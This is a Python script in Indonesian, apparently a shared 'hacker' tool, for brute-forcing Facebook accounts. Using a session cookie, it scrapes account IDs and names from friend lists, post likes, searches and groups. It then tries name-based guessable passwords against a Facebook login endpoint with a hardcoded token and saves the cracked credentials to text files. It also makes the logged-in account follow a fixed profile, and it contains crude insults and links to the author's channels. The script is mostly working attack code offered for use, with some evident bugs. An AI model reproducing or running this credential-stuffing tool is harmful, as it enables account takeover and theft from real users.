#!/usr/bin/python
# -*- coding: utf-8 
# coding by Milzu TC 
#fb author = MÎŁŽÛ Ťč
#fb author =basari.shp
#JANGAN DI RECODE YA BABI
#untuk sementara Sc di update

import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor

def mulai():
    os.system("git pull")
def lupo_lupo_milzu():
    os.system("clear")
def mil(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./50)
def aink(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./10)
def pro(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./5)
def kontol(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./20)

time.sleep(0.1)
lupo_lupo_milzu()
mil("""\033[38;5;208m ██████╗░░█████╗░██████╗░██╗░░░██╗░██████╗
 \033[93m██╔══██╗██╔══██╗██╔══██╗██║░░░██║██╔════╝
 ██████╦╝███████║██████╔╝██║░░░██║╚█████╗░
 \033[95m██╔══██╗██╔══██║██╔══██╗██║░░░██║░╚═══██╗
 ██████╦╝██║░░██║██║░░██║╚██████╔╝██████╔╝
 \033[94m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░   \033[91m Versi.2""")
mil("\x1b[38;5;208m╔══════════════════════════════════════════════════════╗")
mil("\x1b[38;5;208m║ \033[97m*\x1b[38;5;208mYoutube  \033[97m: \x1b[38;5;208mDarkKingMilzu                            ║")
mil("\x1b[38;5;208m║ \033[97m*\x1b[38;5;208mFacebook \033[97m: \x1b[38;5;208mMilzu\033[97m-\x1b[38;5;208mTc                                 ║")
mil("\x1b[38;5;208m║ \033[97m*\x1b[38;5;208minstagram\033[97m: \x1b[38;5;208mmilzu\033[97m_\x1b[38;5;208mtc\033[97m_\x1b[38;5;208mhacker                          ║")
mil("\x1b[38;5;208m╚══════════════════════════════════════════════════════╝")
aink("\033[97m* \x1b[38;5;208mWelcome To tools\033[97m...")
#aink("\033[97m* \x1b[38;5;208mJoin >\033[97m=\x1b[38;5;208m RPL\033[97m•\x1b[38;5;208mTEAM\033[97m•X\x1b[38;5;208m CODE \033[97m=\x1b[38;5;208m<\033[97m...")
#mil("\033[97m* \033[97mPassword Login With \x1b[38;5;208mWhatsapp")
#mil("\033[97m* \x1b[38;5;208mWhatsapp\033[97m Me: \033[97m[ \x1b[38;5;208m+6283182713104 \033[97m]")

mil("\n⟨•⟩▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬⟨•⟩")
nama = input("   \033[95m╚══[\033[97m01] \033[92mNama Kamu\033[95m            : \033[93m ")
###bk = input("   \033[95m╚══[\033[97m02] \033[92mNama Belakang Mu\033[95m          : \033[93m ")
yo = input("   \033[95m╚══[\033[97m03] \033[92mTempat Tinggal\033[95m : \033[93m ")
Password = "hacker"

loop = 'true'
while (loop == 'true'):
    passcode = input("\n\033[1;93m[?] \033[92mPassword Tools\033[95m:\033[93m ")
    if (passcode == Password):
            loop = 'false'
    else:
            os.system('xdg-open https://chat.wa.me/08976622679?text=*Asalamualaikum+bang+Minta+Pasword+Scnya+Bang😅*')
            aink('Yang Bener Masukin nya Kontol !!')
            exit('paswordnya salah goblok')


def fail():
        a=requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","userAgent":"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.39 Mobile Safari/537.36"}).json()
        try:
            ip = a["query"]
        except KeyError:
            ip = " "
        try:
            ng = a["country"]
        except KeyError:
            ng = " "
        try:
            pr = a["regionName"]
        except KeyError:
            pr = " "
        try:
            kt = a["city"]
        except KeyError:
            kt = " "
        try:
            tz = a["timezone"]
        except KeyError:
            tz = " "
        try:
            sp = a["isp"]
        except KeyError:
            sp = " "
        print("\033[97m[\033[91m▪\033[97m]IP ANDA    \033[97m | \033[96m " + ip)
        print("\033[97m[\033[91m▪\033[97m]Negara     \033[97m | \033[96m " + ng)
        print("\033[97m[\033[91m▪\033[97m]Provinsi   \033[97m | \033[96m " + pr)
        print("\033[97m[\033[91m▪\033[97m]Kota       \033[97m | \033[96m " + kt)
        print("\033[97m[\033[91m▪\033[97m]Zona Waktu \033[97m | \033[96m " + tz)
        print("\033[97m[\033[91m▪\033[97m]Kartu Anda \033[97m | \033[96m " + sp)

        print("\n\033[97m[\033[91m✓\033[97m]Nama Anda       :\033[93m ",nama,"")
        print("\033[97m[\033[91m✓\033[97m]Tempat tinggal  :\033[93m ",yo,"")

def peak():
    time.sleep(0.1)
    mil("""
\033[90m █████████
\033[90m █▄█████▄█          \033[91m╔═╦═╗ ╔╗  ╔═╗
\033[90m █ \033[97m▼▼▼▼▼ - _ --_--  \033[91m║ ║ ║ ╠╩╗ ╠╣
\033[90m █ \033[97m _-_-- -_ --__ \033[96mC\033[90m.\033[97m╝   ╚ ╚═╝ ╚   \033[97mINDONESIA \033[91mVersion.2
\033[90m █ \033[97m▲▲▲▲▲ --  - _ - 
\033[90m █████████    🎭\033[90mPembuat Tools   : \033[92mMrxMilzu&BruteElite
\033[90m  ██  ██      🎭\033[90mPengarang/Edit  : \033[92mFxki-\033[96mCyber
              🎭\033[90mPengupdate Tools: \033[92mMilzx-Baz
 \033[90m╔═════════════════════════════════════════════════
 \033[90m║•\033[96mCyber \033[91m🄼\033[97m🅄\033[91m🄻\033[97m🅃\033[91m🄸 \033[91m🄱\033[97m🅁\033[91m🅄\033[97m🅃\033[91m🄴 \033[91m🄵\033[97m🄾\033[91m🅁\033[97m🄲\033[91m🄴
 \033[90m║\033[96m•Subscribe\033[91m:\033[97mMILZU-TC TUTORIAL77
 \033[90m║═════════════════════════════════════════════════
 \033[90m║\033[97m•Tahun Pembuatan tools\033[91m:\033[92m2021
 \033[90m║═════════════════════════════════════════════════
 \033[90m║\033[97m•UPDATE               \033[91m:\033[92mSelasa,31Mai,2022
 \033[90m║═════════════════════════════════════════════════
 \033[90m║\033[97m[\033[90m+\033[97m]\033[97mxAuthor  \033[97m: \033[97mMilzu-Baz
 \033[90m║\033[97m[\033[90m+\033[97m]\033[97mWhatsApp\033[97m: \033[97m+628976622679
 \033[90m║\033[97m[\033[90m+\033[97m]\033[97mFacebook \033[97m: \033[97mfacebook.com/Mîłžû Ťč
 \033[90m║═════════════════════════════════════════════════ """)

def mbfv2():
    time.sleep(0.1)
    mil(" \x1b[90m║═╔═══════════════════════════════════════════════╗")
    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m01.\033[97mNext                                \033[91m~═\033[90m║")
    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m02.\033[97mcara mendapatkan cokie              \033[91m~═\033[90m║")
    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m03.\033[97mmasuk grup fb《COMUNITY》OF THE HACKER\033[90m║")
    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m04.\033[97mmasuk grup whatsapp                 \033[91m~═\033[90m║")
    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m05.\033[97mupgrade tools                       \033[91m~═\033[90m║")
    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
    mil(" \033[90m║═╚═>[\033[91m!\033[90m] \033[97m00\033[97m.\033[91mleave                               \033[91m~═\033[90m║")
    mil(" \x1b[90m╚═════════════════════════════════════════════════╝")
    time.sleep(0.1)

  ##  aink(" \033[97mMBASIC MULTI PRENFLIX ")
    aink(" PILIH MENU ")

    aink("\033[97m╭╼[\033[93mCyber Multi Brute Force\033[97m]\033[97m─\033[97m[\033[93mPrenflix\033[97m]")
    aink ("\033[97m~")
    uwu=input("\033[97m╰╼▪\033[93m>   \033[97m")
    if uwu == "1" or uwu =="01":
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         hack = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                   lupo_lupo_milzu()
                   fail()
                   peak()
                   cek = input("\033[0;90m ║═════════════════════════════════╗ \n \033[90m║\033[90m[\033[93mTekan \033[92mopen \033[93muntuk membuka Cokie\033[0;90m]\033[90m ║ \n \033[90m╚═════════════════════════════════╝ \n \033[90m╔═════════════════════════════════╗\n \033[90m║[\033[91m>_<\033[90m] \033[92mCokiee \033[1;91m~>\033[90m                  \033[90m║\n \033[90m╚═════════════════════════════════╝\033[1;93m\n")
                   print('\n\033[97m [\033[92m*\033[97m] \033[92mHarap bersabar...')
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[1;97m[\033[1;94m+\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/100051967952842"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
                     aink('\033[1;97m[\033[1;94m+\033[1;97m] \033[1;92m[✓] Login berhasil Ngab...')
             else:
                ###  os.system("xdg-open https://youtu.be/QF0jMxC6CkE") 
                  os.system('rm -rf cookies')
                  print(" \n \033[93m[\033[91m!\033[93m] [x] Cookie Kadaluwarsa/Salah...")
                  mbfv2()
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://m.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[1;97m  OK => {username}|{password}                       ",end="")
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('now.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[1;97m  OK => {username}|{password}                    ",end="")
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('cp.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/•'):
                            print(f"\r\033[00m [\033[96m{i}\033[00m] \033[97mPROSES : \033[90m[\033[1;92m{str(die)}\033[90m] \033[93mcheckpoint \033[91m: \033[90m[\033[1;93m{str(check)}\033[90m] \033[92mNow \033[91m: \033[90m[\033[1;92m{str(result)}\033[90m]\033[00m",end="")
                            time.sleep(0.1)
                            print()
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[1;97m [\033[1;97m+\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97m Process ",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit(" \033[1;97m [\033[1;94m•\033[1;97m] Link Not Found!")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r \033[1;96m{str(len(id))} \033[1;97mSEARCH ID... ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[1;97m [\033[1;92m+\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProses mengambil ID... ",end="")
                 pro()
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   lupo_lupo_milzu()
                   fail()
                   peak()
                   mil(" \033[97m║═*\033[92m HACKER MILZU-BAZ NIH BOSS")
                   mil(" \033[97m║═*\033[92m NO WA: 6283182713104")
                   mil(" \033[92m║══════════════════════════════════════════════════")
                   mil(" \033[97m║═*\033[92m Saran Pilih \033[97m>\033[92m5\033[97m<")
                   mil(" \x1b[97m║═╔═══════════════════════════════════════════════╗")
                   mil(" \033[97m║═╚═>\033[90m[\033[91mx\033[90m] \033[93m01\033[97m.\033[93m HACK DAFTAR TEMAN                  \033[97m~═║")
                   mil(" \033[97m║═╔═════════════════════════════════════════════~═║")
                   mil(" \033[97m║═╚═>\033[90m[\033[91mx\033[90m] \033[93m02\033[97m.\033[93m HACK DARI LIKE POST                \033[97m~═║")
                   mil(" \033[97m║═╔═════════════════════════════════════════════~═║")
                   mil(" \033[97m║═╚═>\033[90m[\033[91mx\033[90m] \033[93m03\033[97m.\033[93m HACK DARI PENCARIAN NAMA           \033[97m~═║")
                   mil(" \033[97m║═╔═════════════════════════════════════════════~═║")
                   mil(" \033[97m║═╚═>\033[90m[\033[91mx\033[90m] \033[93m04\033[97m.\033[93m HACK DARI GRUP                     \033[97m~═║")
                   mil(" \033[97m║═╔═════════════════════════════════════════════~═║")
                   mil(" \033[97m║═╚═>\033[90m[\033[97m√\033[90m] \033[97m05\033[97m.\033[97m HACK DARI PUBLIK                   \033[97m~═║")
                   mil(" \033[97m║═╔═════════════════════════════════════════════~═║")
                   mil(" \033[97m║═╚═>\033[90m[\033[97m√\033[90m] \033[97m06\033[97m.\033[97m LIHAT HASIL HACK                   \033[97m~═║")
                   mil(" \x1b[97m║═╔═════════════════════════════════════════════~═║")
                   mil(" \033[97m║═╚═>\033[90m[\033[97m√\033[90m] \033[97m07\033[97m.\033[97mHAPUS BISKUIT YANG LEZAT            \033[97m~═║")
                   mil(" \033[97m║═╔═════════════════════════════════════════════~═║")
                   mil(" \033[97m║═╚═>\033[90m[\033[93m-\033[90m] \033[97m00\033[97m.\033[91mKELUAR                              \033[97m~═║")
                   mil(" \033[97m╚═════════════════════════════════════════════════╝")
                   aink("\033[97m╭╼[PILIH]─[MENU]-[MILZU]")
                   aink ("\033[97m~")
                   doge=input("\033[97m╰╼▪>   \033[97m")
                   if doge =="":
                         aink("\n\n\033[00m [\033[91m!\033[00m] Harus dipilih!")
                         exit()
                   elif doge == '0' or doge =='00':
                         aink("\n\033[1;92m Terima kasih sudah menggunakan tools.\n  Kamu diwajibkan subscribe Channel Author!!\n\n")
                         os.system('xdgu-open  https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ')
                         exit()                   	
                   elif doge == '7' or doge =='07':
                         mil("\n\x1b[1;97m [\x1b[1;96m*\x1b[1;97m] \x1b[1;96mHarap bersabar... ")
                         aink("\x1b[1;91m ▪ 10")
                         aink("\x1b[1;91m ▪▪ 20")
                         aink("\x1b[1;91m ▪▪▪ 30")
                         aink("\x1b[1;91m ▪▪▪▪ 40")
                         aink("\x1b[1;93m ▪▪▪▪▪ 50")
                         aink("\x1b[1;93m ▪▪▪▪▪▪ 60")
                         aink("\x1b[1;93m ▪▪▪▪▪▪▪ 70")
                         aink("\x1b[1;93m ▪▪▪▪▪▪▪▪ 80")
                         aink("\x1b[1;92m ▪▪▪▪▪▪▪▪▪ 90")
                         aink("\x1b[1;92m ▪▪▪▪▪▪▪▪▪▪ 100%")
                         os.system("rm -rf cookies")
                         mil("\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]\x1b[1;93m done delete cookie!")
                         mbfv2()
                   elif doge == '1' or doge =='01':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif doge == '2' or doge =='02':
                         username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] \033[93mMasukin Link post \033[1;91m: \033[1;93m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] \033[91mLink post tidak ditemukan!")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'www.facebook' in username:
                                 username = username.replace('m.facebook','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif doge == '3' or doge =='03':
                         search = input(" \033[97mlookat:\033[92m ")
                         username = bysearch(mbasic.format('/search/people/?q='+search))
                         if len(username) == 0:
                                 exit(" Nama Failed !")
                   elif doge == '4' or doge =='04':
                         mil("\033[1;97m\n [\033[1;94m▪▪\033[1;97m] Harap di isi \033[91m100 \033[00mID Grup ")
                         grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[93mMasukkan ID Grup \033[1;91m: \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id="+grab))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[90m] \033[97mGRUP ID TIDAK DITEMUKAN!")
                   elif doge == '5' or doge =='05':
                         print("[\033[91m!\033[97m] ID HARUS PUBLIK NOT PRIVATE")
                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] \033[92mID\033[1;91m: \033[1;92m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("tidak dapat menemukan...")
                   elif doge == '6' or doge =='06':
                         try:
                                 file1 = open("cp.txt").read()
                                 file2 = open("now.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 mil(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] User sedang di check ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 for x in result:
                                         with open('now.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('cp.txt','a') as f:
                                                 f.write(x+"\n")

                                 aink("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Selesai...")
                                 aink("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] [ JANGAN LUPA BERSYUKUR ]")
                                 aink("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Di Save Di/save for \033[1;93mcp.txt\033[96m|\033[1;92mnow.txt")
                         except FileNotFoundError:
                                 exit("\n\033[00m[\033[91m!\033[00m] MAAF SC MAINTANCE...")
                   else:
                         mil("\n\n \033[00m[\033[91m😣\033[00m] harus dipilih!")
                         exit()
                   time.sleep(1./8)
                   print()
                   lupo_lupo_milzu()
                   fail()
                   peak()
                   print('\033[97m\033[92mJUMLAH ID FB\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m \n",end="")       
                   mil('\033[5m Catatan dari Saya...')
                   mil('\033[5m Saya Harap Anda Harus Mengisi Pasword !!')
                   mil('\033[5m Jika tidak Proses Crack Akan Lama Berjalan...')
                   mil('\033[5m Jangan Banyak Kalimat Yang Di Isikan Dalam Password...')
                   mil('\033[5m Jika Tidak Di Isikan Password Str Belum Tentu Support Dengan Hal tb !!')
                   mil('                            ')
                   expass = input("\n\033[1;93m [\033[1;96m?\033[1;93m] + Password 1 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;92m [\033[1;96m?\033[1;92m] + Password 2\033[1;91m: \033[1;92m")
                   expass = input("\033[1;92m [\033[1;96m?\033[1;92m] + Password 3 \033[1;91m: \033[1;92m")
                   mil('\x1b[1;94m────────────────────────────────────────────────────\n')
                   lupo_lupo_milzu()
                   fail()
                   peak()
                   print('\033[92m   Total ID\x1b[1;91m : ' + str(len(id)) + "\n\x1b[1;97m \n",end="")
                   print('\n\033[91m [\033[1;90m+\033[91m] \033[97mhasil\033[92m Now\033[97m di\033[92msimpan \033[97mdi \033[93m: \033[92mnow.txt\n \033[91m[\033[90m-\033[91m] \033[97mhasil\x1b[1;93m Checkpoint \033[97mdi\033[92msimpan \033[97mdi \033[91m: \033[93mcp.txt')
                   print('\n \033[97m[\x1b[1;91m▪\x1b[1;97m] \033[91mMatikan \033[92mdata \033[97mseluler untuk menjeda proses \033[93mcrack\n')
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '',' ','  ',
                                                  str(x) + '123','12345','1234'
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;92m  *\033[92m Selesai...")
     
                   else:
                           print("\n\n\x1b[1;91m  *\033[93m Tidak ada hasil :(")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\n\n\033[00m  [\033[91m!\033[00m] Connection")

    elif uwu == "2" or uwu =="02":
         os.system("xdg-open https://youtu.be/QF0jMxC6CkE")
         mbfv2()
    elif uwu == "3" or uwu =="03":
         os.system('xdg-open https://www.facebook.com/groups/338110617616908')
         mbfv2()
    elif uwu == "4" or uwu =="04":
         time.sleep(0.01)
         aink("Mau masuk Grup WhatsApp Ya om...")
         aink("jangan lupa jika masuk bawa gorengan ya om...")
         aink("daftarkan diri kamu ke admin ya om...")
         os.system('xdg-open https://chat.whatsapp.com/K4FgARckBivK9AQACzo5ae')
         mbfv2()
    elif uwu == "5" or uwu =="05":
         time.sleep(0.1)
         aink(" [\033[97m Sabar om sedang di update... \033[97m ]")
         aink("\033[97m [~] update Process ")
         os.system("git pull")
         aink(" Sudah di update om.!! ")
         aink(" Silahkan Mulai Ulang... ")
         aink(" untuk menjalankan proses update => python mbfv2.py")
         exit()
    elif uwu == "0" or uwu =="00":
         time.sleep(0.1)
         aink("\n\033[1;92m Terima kasih sudah menggunakan tools ini.\n jangan lupa subscribe chanel youtube author!!\n\n")
         os.system("xdg-open https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ")
         aink("\033[97m Sampai ketemu dimasa depan ya om...")
         exit()

if __name__=="__main__":
     lupo_lupo_milzu()
     mulai()
     lupo_lupo_milzu()
     fail()
     peak()
     mbfv2()
